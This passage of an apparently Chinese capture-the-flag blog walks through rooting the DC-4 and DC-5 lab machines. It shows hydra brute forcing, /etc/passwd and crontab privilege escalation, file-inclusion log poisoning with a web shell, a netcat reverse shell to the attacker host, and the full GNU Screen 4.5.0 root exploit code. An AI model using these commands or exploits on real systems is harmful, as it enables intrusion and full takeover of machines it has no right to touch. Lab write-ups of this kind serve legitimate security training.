class="number">16.04</span><span class="number">.2</span>/<span class="number">17.04</span> / Fedora <span class="number">23</span>/<span class="number">24</span>/<span class="number">25</span>) - <span class="string">'ldso_dynami | exploits/linux_x86/local/42276.c</span></span><br><span class="line"><span class="string">Linux Kernel (Ubuntu 16.04) - Reference Count Overflow Using BPF Maps                      | exploits/linux/dos/39773.txt</span></span><br><span class="line"><span class="string">Linux Kernel 4.14.7 (Ubuntu 16.04 / CentOS 7) - (KASLR &amp; SMEP Bypass) Arbitrary File Read  | exploits/linux/local/45175.c</span></span><br><span class="line"><span class="string">Linux Kernel 4.4 (Ubuntu 16.04) - '</span>BPF<span class="string">' Local Privilege Escalation (Metasploit)            | exploits/linux/local/40759.rb</span></span><br><span class="line"><span class="string">Linux Kernel 4.4 (Ubuntu 16.04) - '</span>snd_timer_user_ccallback()<span class="string">' Kernel Pointer Leak         | exploits/linux/dos/46529.c</span></span><br><span class="line"><span class="string">Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - '</span>AF_PACKET<span class="string">' Race Condition Privilege Esca | exploits/linux_x86-64/local/40871.c</span></span><br><span class="line"><span class="string">Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter target_offset Out-of-Bounds Privilege | exploits/linux_x86-64/local/40049.c</span></span><br><span class="line"><span class="string">Linux Kernel 4.4.0-21 &lt; 4.4.0-51 (Ubuntu 14.04/16.04 x86-64) - '</span>AF_PACKET<span class="string">' Race Condition  | exploits/linux/local/47170.c</span></span><br><span class="line"><span class="string">Linux Kernel 4.4.x (Ubuntu 16.04) - '</span>double-fdput()<span class="string">' bpf(BPF_PROG_LOAD) Privilege Escalati | exploits/linux/local/39772.txt</span></span><br><span class="line"><span class="string">Linux Kernel 4.6.2 (Ubuntu 16.04.1) - '</span>IP6T_SO_SET_REPLACE<span class="string">' Local Privilege Escalation     | exploits/linux/local/40489.txt</span></span><br><span class="line"><span class="string">Linux Kernel 4.8 (Ubuntu 16.04) - Leak sctp Kernel Pointer                                 | exploits/linux/dos/45919.c</span></span><br><span class="line"><span class="string">Linux Kernel &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation              | exploits/linux/local/45010.c</span></span><br><span class="line"><span class="string">Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                     | exploits/linux/local/44298.c</span></span><br><span class="line"><span class="string">Linux Kernel &lt; 4.4.0-21 (Ubuntu 16.04 x64) - '</span>netfilter target_offset<span class="string">' Local Privilege Esc | exploits/linux/local/44300.c</span></span><br><span class="line"><span class="string">Linux Kernel &lt; 4.4.0-83 / &lt; 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KA | exploits/linux/local/43418.c</span></span><br><span class="line"><span class="string">Linux Kernel &lt; 4.4.0/ &lt; 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Priv | exploits/linux/local/47169.c</span></span><br><span class="line"><span class="string">------------------------------------------------------------------------------------------- ----------------------------------------</span></span><br></pre></td></tr></table></figure>

<p><strong>查看该exp的使用方法，先执行compile.sh、再执行doubleput即可</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># cp /usr/share/exploitdb/exploits/linux/local/39772.txt ubuntu_v1604_shell.txt</span></span><br><span class="line">root@kali:~<span class="comment"># cat ubuntu_v1604_shell.txt </span></span><br><span class="line">An exploit that puts all this together is <span class="keyword">in</span> exploit.tar. Usage:</span><br><span class="line"></span><br><span class="line">user@host:~/ebpf_mapfd_doubleput<span class="variable">$</span> ./compile.sh</span><br><span class="line">user@host:~/ebpf_mapfd_doubleput<span class="variable">$</span> ./doubleput</span><br><span class="line">starting writev</span><br><span class="line">woohoo, got pointer reuse</span><br><span class="line">writev returned successfully. <span class="keyword">if</span> this worked, you<span class="string">'ll have a root shell in &lt;=60 seconds.</span></span><br><span class="line"><span class="string">suid file detected, launching rootshell...</span></span><br><span class="line"><span class="string">we have root privs now...</span></span><br><span class="line"><span class="string">root@host:~/ebpf_mapfd_doubleput# id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),999(vboxsf),1000(user)</span></span><br></pre></td></tr></table></figure>

<p>先下载到本地解压缩后，开启本地的web服务器，上传到目标服务器，由于文件过大，蚁剑无法上传</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</span></span><br><span class="line">unzip <span class="number">39772.</span>zip</span><br><span class="line">cd <span class="number">39772</span></span><br><span class="line">root@kali:~<span class="comment"># python -m SimpleHTTPServer 8000  #搭建http服务，提供文件浏览的web服务</span></span><br><span class="line">Serving HTTP on <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> port <span class="number">8000</span> ...</span><br><span class="line">$ wget http://<span class="number">192.168</span><span class="number">.126</span><span class="number">.33</span>:<span class="number">8000</span>/exploit.tar <span class="comment">#下载文件</span></span><br><span class="line">tar -xvf exploit.tar</span><br><span class="line">cd ebpf_mapfd_doubleput_exploit</span><br><span class="line">./compile.sh </span><br><span class="line">./doubleput</span><br><span class="line">cat the-flag.txt</span><br><span class="line"> __        __   _ _   ____                   _ _ _ _ </span><br><span class="line"> \ \      / /__| | | |  _ \  ___  _ __   ___| | | | |</span><br><span class="line">  \ \ /\ / / _ \ | | | | | |/ _ \| <span class="string">'_ \ / _ \ | | | |</span></span><br><span class="line"><span class="string">   \ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|</span></span><br><span class="line"><span class="string">    \_/\_/ \___|_|_| |____/ \___/|_| |_|\___(_|_|_|_)</span></span><br><span class="line"><span class="string">                                                     </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Congratulations are in order.  :-)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">I hope you'</span>ve enjoyed this challenge <span class="keyword">as</span> I enjoyed making it.</span><br></pre></td></tr></table></figure>



<hr>
<h2 id="DC-4渗透过程"><a href="#DC-4渗透过程" class="headerlink" title="DC-4渗透过程"></a><strong>DC-4渗透过程</strong></h2><p><strong>登陆页面，提示用admin登陆，这里用password.list密码本爆破，rockyou.txt需要很久时间，求出密码后登陆发现可以执行命令有回显，抓包修改反弹shell，发现了一个密码本，可能是用来爆破ssh账号的，用scp发送到本地</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/usr/share/john<span class="comment"># hydra -l admin -P ./password.lst -f 192.168.126.149 http-post-form "/login.php:username=^USER^&amp;password=^PASS^:S=logout" -v</span></span><br><span class="line"></span><br><span class="line">[<span class="type">VERBOSE</span>] Page redirected to http://<span class="number">192.168</span>.<span class="number">126.149</span>/index.php</span><br><span class="line">[<span class="type">VERBOSE</span>] Page redirected to http://<span class="number">192.168</span>.<span class="number">126.149</span>/index.php</span><br><span class="line">[<span class="number">80</span>][<span class="type">http</span>-<span class="type">post</span>-<span class="type">form</span>] host: <span class="number">192.168</span>.<span class="number">126.149</span>   login: admin   password: happy</span><br><span class="line"></span><br><span class="line"><span class="comment">#将文件发送到本地</span></span><br><span class="line">root@dc<span class="literal">-4</span>:/home/jim/backups<span class="comment"># scp ./old-passwords.bak root@192.168.126.33:/root/tools</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#密码爆破，-t 64 表示线程数  -f 表示找到密码即停   -v表示显示具体的</span></span><br><span class="line">root@kali:~<span class="comment"># hydra -L users.txt -P pswd.txt ssh://192.168.126.149 -t 64 -f -v</span></span><br><span class="line">[<span class="number">22</span>][<span class="type">ssh</span>] host: <span class="number">192.168</span>.<span class="number">126.149</span>   login: jim   password: jibril04</span><br><span class="line"></span><br><span class="line">root@kali:/usr/share/john<span class="comment"># ssh jim@192.168.126.149 </span></span><br><span class="line">jim@<span class="number">192.168</span>.<span class="number">126.149</span><span class="string">'s password: </span></span><br><span class="line"><span class="string">Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i68</span></span><br><span class="line"><span class="string">You have mail.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#发现邮件，查看邮件信息</span></span><br><span class="line"><span class="string">jim@dc-4:~$ cd /var/mail</span></span><br><span class="line"><span class="string">jim@dc-4:/var/mail$ ls</span></span><br><span class="line"><span class="string">jim  www-data</span></span><br><span class="line"><span class="string">jim@dc-4:/var/mail$ cat jim</span></span><br><span class="line"><span class="string">From charles@dc-4 Sat Apr 06 21:15:46 2019</span></span><br><span class="line"><span class="string">Return-path: &lt;charles@dc-4&gt;</span></span><br><span class="line"><span class="string">Hi Jim,</span></span><br><span class="line"><span class="string">I'</span>m heading off on holidays at the <span class="keyword">end</span> of today, so the boss asked me to give you my password just <span class="keyword">in</span> case anything goes wrong.</span><br><span class="line">Password is:  ^xHhA&amp;hvim0y</span><br><span class="line">See ya,</span><br><span class="line">Charles</span><br></pre></td></tr></table></figure>

<p><strong>信中给出了charles的密码，切换账户，查看是否有提权的途径，发现teehee命令可以执行root权限</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">charles@dc<span class="literal">-4</span>:~<span class="variable">$</span> sudo <span class="literal">-l</span></span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> charles on dc<span class="literal">-4</span>:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User charles may run the following commands on dc<span class="literal">-4</span>:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/teehee</span><br><span class="line"></span><br><span class="line">root@dc<span class="literal">-4</span>:/home/jim/backups<span class="comment"># teehee --help #查看teehee的用法</span></span><br><span class="line">Usage: teehee [<span class="type">OPTION</span>]... [<span class="type">FILE</span>]...</span><br><span class="line">Copy standard input to each FILE, and also to standard output.</span><br><span class="line"></span><br><span class="line">  <span class="literal">-a</span>, -<span class="literal">-append</span>              append to the given FILEs, <span class="keyword">do</span> not overwrite</span><br><span class="line">  <span class="literal">-i</span>, -<span class="literal">-ignore</span><span class="literal">-interrupts</span>   ignore interrupt signals</span><br><span class="line">  <span class="literal">-p</span>                        diagnose errors writing to non pipes</span><br><span class="line">      -<span class="literal">-output</span><span class="literal">-error</span>[=<span class="type">MODE</span>]   set behavior on write error.  See MODE below</span><br><span class="line">      -<span class="literal">-help</span>     display this help and <span class="keyword">exit</span></span><br><span class="line">      -<span class="literal">-version</span>  output version information and <span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#teehee -a 表示写入文件，但是不会覆盖，所以可以通过写入一个root用户来执行root权限</span></span><br><span class="line">charles@dc<span class="literal">-4</span>:~<span class="variable">$</span> echo <span class="string">"admin::0:0:admin::/bin/bash"</span>|sudo teehee <span class="literal">-a</span> /etc/passwd</span><br><span class="line">admin::<span class="number">0</span>:<span class="number">0</span>:admin::/bin/bash  <span class="comment">##[用户名]：[密码]：[UID]：[GID]：[身份描述]：[主目录]：[登录shell]</span></span><br><span class="line">charles@dc<span class="literal">-4</span>:~<span class="variable">$</span> su admin</span><br><span class="line">root@dc<span class="literal">-4</span>:/home/charles<span class="comment"># cd /root</span></span><br><span class="line">root@dc<span class="literal">-4</span>:/root<span class="comment"># ls</span></span><br><span class="line">flag.txt</span><br><span class="line">root@dc<span class="literal">-4</span>:/root<span class="comment"># cat flag.txt </span></span><br><span class="line"></span><br><span class="line"><span class="number">888</span>       <span class="number">888</span>          <span class="number">888</span> <span class="number">888</span>      <span class="number">8888888</span>b.                             <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> </span><br><span class="line"><span class="number">888</span>   o   <span class="number">888</span>          <span class="number">888</span> <span class="number">888</span>      <span class="number">888</span>  <span class="string">"Y88b                            888 888 888 888 </span></span><br><span class="line"><span class="string">888  d8b  888          888 888      888    888                            888 888 888 888 </span></span><br><span class="line"><span class="string">888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 </span></span><br><span class="line"><span class="string">888d88888b888 d8P  Y8b 888 888      888    888 d88"</span><span class="string">"88b 888 "</span><span class="number">88</span>b d8P  Y8b <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> </span><br><span class="line"><span class="number">88888</span>P Y88888 <span class="number">88888888</span> <span class="number">888</span> <span class="number">888</span>      <span class="number">888</span>    <span class="number">888</span> <span class="number">888</span>  <span class="number">888</span> <span class="number">888</span>  <span class="number">888</span> <span class="number">88888888</span> Y8P Y8P Y8P Y8P </span><br><span class="line"><span class="number">8888</span>P   Y8888 Y8b.     <span class="number">888</span> <span class="number">888</span>      <span class="number">888</span>  .d88P Y88..<span class="number">88</span>P <span class="number">888</span>  <span class="number">888</span> Y8b.      <span class="string">"   "</span>   <span class="string">"   "</span>  </span><br><span class="line"><span class="number">888</span>P     Y888  <span class="string">"Y8888  888 888      8888888P"</span>   <span class="string">"Y88P"</span>  <span class="number">888</span>  <span class="number">888</span>  <span class="string">"Y8888  888 888 888 888 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Congratulations!!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#通过teehee的sudo提升权限以 root身份写入crontab计划任务通过执行获取root权限</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">cat crontab # 可见文件有格式将授权命令写入该文件授权root bash</span></span><br><span class="line"><span class="string">charles@dc-4:/home/jim<span class="variable">$</span> cat /etc/crontab</span></span><br><span class="line"><span class="string"># /etc/crontab: system-wide crontab</span></span><br><span class="line"><span class="string"># Unlike any other crontab you don't have to run the `crontab'</span></span><br><span class="line"><span class="string"># command to install the new version when you edit this file</span></span><br><span class="line"><span class="string"># and files in /etc/cron.d. These files also have username fields,</span></span><br><span class="line"><span class="string"># that none of the other crontabs do.</span></span><br><span class="line"><span class="string">SHELL=/bin/sh</span></span><br><span class="line"><span class="string">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">echo  "</span>* * * * * root chmod <span class="number">4777</span> /bin/sh<span class="string">" | sudo teehee -a /etc/crontab</span></span><br><span class="line"><span class="string">#时间部分全部填写为*，默认这个定时任务每分钟执行一次</span></span><br><span class="line"><span class="string">#通过执行的脚本将 /bin/sh 的权限修改为4777，这样就可以在非root用户下执行它，并且执行期间拥有root权限。</span></span><br><span class="line"><span class="string">charles@dc-4:/home/jim<span class="variable">$</span> /bin/sh</span></span><br><span class="line"><span class="string"># whoami</span></span><br><span class="line"><span class="string">root</span></span><br><span class="line"><span class="string"># ls /root</span></span><br><span class="line"><span class="string">flag.txt</span></span><br></pre></td></tr></table></figure>



<hr>
<h2 id="DC-5渗透过程"><a href="#DC-5渗透过程" class="headerlink" title="DC-5渗透过程"></a><strong>DC-5渗透过程</strong></h2><p><strong>看了下网站首页没啥切入点，爆破下后台路径，发现了两个新路径</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/<span class="comment"># dirb http://192.168.126.155/ -X .php -S</span></span><br><span class="line">URL_BASE: http://<span class="number">192.168</span>.<span class="number">126.155</span>/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt <span class="comment">#默认字典</span></span><br><span class="line">---- Scanning URL: http://<span class="number">192.168</span>.<span class="number">126.155</span>/ ----</span><br><span class="line">+ http://<span class="number">192.168</span>.<span class="number">126.155</span>/ab<span class="built_in">out-us</span>.php (CODE:<span class="number">200</span>|SIZE:<span class="number">4292</span>)</span><br><span class="line">+ http://<span class="number">192.168</span>.<span class="number">126.155</span>/contact.php (CODE:<span class="number">200</span>|SIZE:<span class="number">4282</span>)</span><br><span class="line">+ http://<span class="number">192.168</span>.<span class="number">126.155</span>/faq.php (CODE:<span class="number">200</span>|SIZE:<span class="number">5645</span>)</span><br><span class="line">+ http://<span class="number">192.168</span>.<span class="number">126.155</span>/footer.php (CODE:<span class="number">200</span>|SIZE:<span class="number">17</span>)  <span class="comment">#隐藏路径</span></span><br><span class="line">+ http://<span class="number">192.168</span>.<span class="number">126.155</span>/index.php (CODE:<span class="number">200</span>|SIZE:<span class="number">4025</span>)</span><br><span class="line">+ http://<span class="number">192.168</span>.<span class="number">126.155</span>/solutions.php (CODE:<span class="number">200</span>|SIZE:<span class="number">4100</span>) </span><br><span class="line">+ http://<span class="number">192.168</span>.<span class="number">126.155</span>/thankyou.php (CODE:<span class="number">200</span>|SIZE:<span class="number">852</span>)  <span class="comment">#隐藏路径</span></span><br></pre></td></tr></table></figure>

<p><strong>提示thankyou.php存在文件包含漏洞，测试下发现确实可以，查看日志文件，可以写入一句话木马</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">126.155</span>/thankyou.php?file=../../../etc/passwd</span><br><span class="line">http://<span class="number">192.168</span>.<span class="number">126.155</span>/thankyou.php?file=/var/log/nginx/error.log</span><br></pre></td></tr></table></figure>

<p><strong>写入payload到日志，因为错误的请求会写入error.log，查看日志，成功插入，蚁剑连接成功！</strong></p>
<p><img src="/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/4.png" alt></p>
<p><img src="/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/5.png" alt></p>
<p><img src="/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/3.png" alt></p>
<p><strong>可以在本地再上传一句话木马文件，方便连接！用虚拟终端反弹shell到主机上</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">(www<span class="literal">-data</span>:/var/www/html) <span class="variable">$</span> nc <span class="literal">-e</span> /bin/bash <span class="number">192.168</span>.<span class="number">126.33</span> <span class="number">2333</span></span><br><span class="line">root@kali:~<span class="comment"># nc -lvvp 2333</span></span><br><span class="line">listening on [<span class="type">any</span>] <span class="number">2333</span> ...</span><br><span class="line"><span class="number">192.168</span>.<span class="number">126.155</span>: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to <span class="function">[<span class="number">192.168</span><span class="type">.126.33</span>] <span class="title">from</span></span> (UNKNOWN) [<span class="number">192.168</span><span class="type">.126.155</span>] <span class="number">47749</span></span><br><span class="line">python <span class="literal">-c</span> <span class="string">'import pty;pty.spawn("/bin/bash")'</span>  </span><br><span class="line"></span><br><span class="line">www<span class="literal">-data</span>@dc<span class="literal">-5</span>:~/html<span class="variable">$</span> find / <span class="literal">-perm</span> <span class="literal">-u</span>=s <span class="literal">-type</span> f <span class="number">2</span>&gt;/dev/null <span class="comment">#查看sudo权限</span></span><br><span class="line">/bin/screen<span class="literal">-4</span>.<span class="number">5.0</span>  <span class="comment">#发现了一个可能可以利用的文件</span></span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># searchsploit screen 4.5.0</span></span><br><span class="line">------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                                             |  Path</span><br><span class="line">                                                                                           | (/usr/share/exploitdb/)</span><br><span class="line">------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">GNU Screen <span class="number">4.5</span>.<span class="number">0</span> - Local Privilege Escalation                                              | exploits/linux/local/<span class="number">41154</span>.sh</span><br><span class="line">GNU Screen <span class="number">4.5</span>.<span class="number">0</span> - Local Privilege Escalation (PoC)                                        | exploits/linux/local/<span class="number">41152</span>.txt</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># searchsploit -m 41154.sh  #把一个exp拷贝到当前工作目录,参数后加目标id</span></span><br><span class="line">  Exploit: GNU Screen <span class="number">4.5</span>.<span class="number">0</span> - Local Privilege Escalation</span><br><span class="line">      URL: https://www.exploit<span class="literal">-db</span>.com/exploits/<span class="number">41154</span></span><br><span class="line">     Path: /usr/share/exploitdb/exploits/linux/local/<span class="number">41154</span>.sh</span><br><span class="line">File Type: Bourne<span class="literal">-Again</span> shell script, ASCII text executable, with CRLF line terminators</span><br><span class="line"></span><br><span class="line">Copied to: /root/<span class="number">41154</span>.sh</span><br></pre></td></tr></table></figure>

<p><strong>按照exp的说明进行操作编译，上传至靶机，注意只能上传到/tmp目录下，执行即可提权</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/tmp<span class="comment"># vi libhax.c</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line">void dropshell(void)&#123;</span><br><span class="line">    chown(<span class="string">"/tmp/rootshell"</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    chmod(<span class="string">"/tmp/rootshell"</span>, <span class="number">04755</span>);</span><br><span class="line">    unlink(<span class="string">"/etc/ld.so.preload"</span>);</span><br><span class="line">    printf(<span class="string">"[+] done!\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">root@kali:/tmp<span class="comment"># gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span></span><br><span class="line"></span><br><span class="line">root@kali:/tmp<span class="comment"># vi rootshell.c</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line">int main(void)&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    seteuid(<span class="number">0</span>);</span><br><span class="line">    setegid(<span class="number">0</span>);</span><br><span class="line">    execvp(<span class="string">"/bin/sh"</span>, NULL, NULL);</span><br><span class="line">&#125;</span><br><span class="line">root@kali:/tmp<span class="comment"># gcc -o /tmp/rootshell /tmp/rootshell.c</span></span><br><span class="line"></span><br><span class="line">root@kali:~/tools<span class="comment"># cat 41154.sh  #将剩下的写入</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">echo <span class="string">"[+] Now we create our /etc/ld.so.preload file..."</span></span><br><span class="line">cd /etc</span><br><span class="line">umask <span class="number">000</span> <span class="comment"># because</span></span><br><span class="line">screen <span class="literal">-D</span> <span class="literal">-m</span> <span class="literal">-L</span> ld.so.preload echo <span class="operator">-ne</span>  <span class="string">"\x0a/tmp/libhax.so"</span> <span class="comment"># newline needed</span></span><br><span class="line">echo <span class="string">"[+] Triggering..."</span></span><br><span class="line">screen <span class="literal">-ls</span> <span class="comment"># screen itself is setuid, so... </span></span><br><span class="line">/tmp/rootshell</span><br><span class="line"></span><br><span class="line">root@kali:~/tools<span class="comment"># ls</span></span><br><span class="line"><span class="number">41154</span>.sh    libhax.so   rootshell</span><br><span class="line"></span><br><span class="line"><span class="comment">#通过蚁剑上传至/tmp目录下</span></span><br><span class="line">www<span class="literal">-data</span>@dc<span class="literal">-5</span>:/tmp<span class="variable">$</span> chmod +x <span class="number">41154</span>.sh</span><br><span class="line">www<span class="literal">-data</span>@dc<span class="literal">-5</span>:/tmp<span class="variable">$</span> ./<span class="number">41154</span>.sh</span><br><span class="line">[+] Now we create our /etc/ld.so.preload file...</span><br><span class="line"><span class="string">' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.</span></span><br><span class="line"><span class="string">[+] done!</span></span><br><span class="line"><span class="string">[+] Triggering...</span></span><br><span class="line"><span class="string"># whoami</span></span><br><span class="line"><span class="string">whoami</span></span><br><span class="line"><span class="string">root</span></span><br><span class="line"><span class="string"># cat thisistheflag.txt</span></span><br><span class="line"><span class="string">cat thisistheflag.txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">888b    888 d8b                                                      888      888 888 888 </span></span><br><span class="line"><span class="string">8888b   888 Y8P                                                      888      888 888 888 </span></span><br><span class="line"><span class="string">88888b  888                                                          888      888 888 888 </span></span><br><span class="line"><span class="string">888Y88b 888 888  .d8888b .d88b.       888  888  888  .d88b.  888d888 888  888 888 888 888 </span></span><br><span class="line"><span class="string">888 Y88b888 888 d88P"   d8P  Y8b      888  888  888 d88""88b 888P"   888 .88P 888 888 888 </span></span><br><span class="line"><span class="string">888  Y88888 888 888     